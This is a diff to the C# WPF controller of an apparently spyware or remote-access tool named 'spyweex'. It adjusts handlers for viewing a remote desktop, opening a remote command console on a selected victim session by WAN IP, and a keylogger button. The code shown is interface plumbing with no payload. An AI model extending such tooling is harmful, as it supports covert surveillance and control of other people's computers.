@@ -66,8 +66,9 @@ namespace spyweex_client_wpf
         private void Window_Loaded(object sender, RoutedEventArgs e)
         {
             SessionListView.ItemsSource = ((ViewModel)DataContext).sessions;
-            ((ViewModel)DataContext).sessions.Add(new Session("1", "123.123.123.123"));
-            ((ViewModel)DataContext).sessions.Add(new Session("2", "321.321.321.321"));
+            //for(int i=0; i<50 ; i++)
+            //((ViewModel)DataContext).sessions.Add(new Session("1", "123.123.123.123"));
+
             //await UpdateIncomingWithDelay();
         }
 
@@ -120,13 +121,11 @@ namespace spyweex_client_wpf
 
         private async void btnDesktopScreen_Clicked(object sender, RoutedEventArgs e)
         {
-            IPEndPoint currentIpEndPoint = Utils.ParseIPEndpoint(((ViewModel) DataContext).SelectedSession.IP);
+            if (dscreenListener.isSubscribed) return;
+            IPEndPoint currentIpEndPoint = Utils.ParseIPEndpoint(((ViewModel) DataContext).SelectedSession.WANIP);
             WxhtpClient wxhtpClient = _wxhtpServiceServer.TryGetClientByIpEndpoint(currentIpEndPoint);
-
-            //if (dsListener.isSubscribed) return;
             try
             {
-
                 wxhtpClient = _wxhtpServiceServer.TryGetLastOrDefaultClient();
                 ct = cts.Token;
                 await wxhtpClient.ExecuteTask(
@@ -160,8 +159,20 @@ namespace spyweex_client_wpf
 
         private void btnCmdPrompt_Clicked(object sender, RoutedEventArgs e)
         {
-            var consoleWindow = new Console { Owner = this };
-            consoleWindow.Show();
+            IPEndPoint currentIpEndPoint = Utils.ParseIPEndpoint(((ViewModel)DataContext).SelectedSession.WANIP);
+            WxhtpClient wxhtpClient = _wxhtpServiceServer.TryGetClientByIpEndpoint(currentIpEndPoint);
+            if (wxhtpClient.isConsoleAttached) return;
+            try
+            {
+                var consoleWindow = new Console {Owner = this};
+                consoleWindow.Show();
+                wxhtpClient.isConsoleAttached = true;
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show("Exception in creating console: \n{0}", ex.ToString());
+            }
+
         }
 
         private void btnKeylogger_Clicked(object sender, ContextMenuEventArgs e)
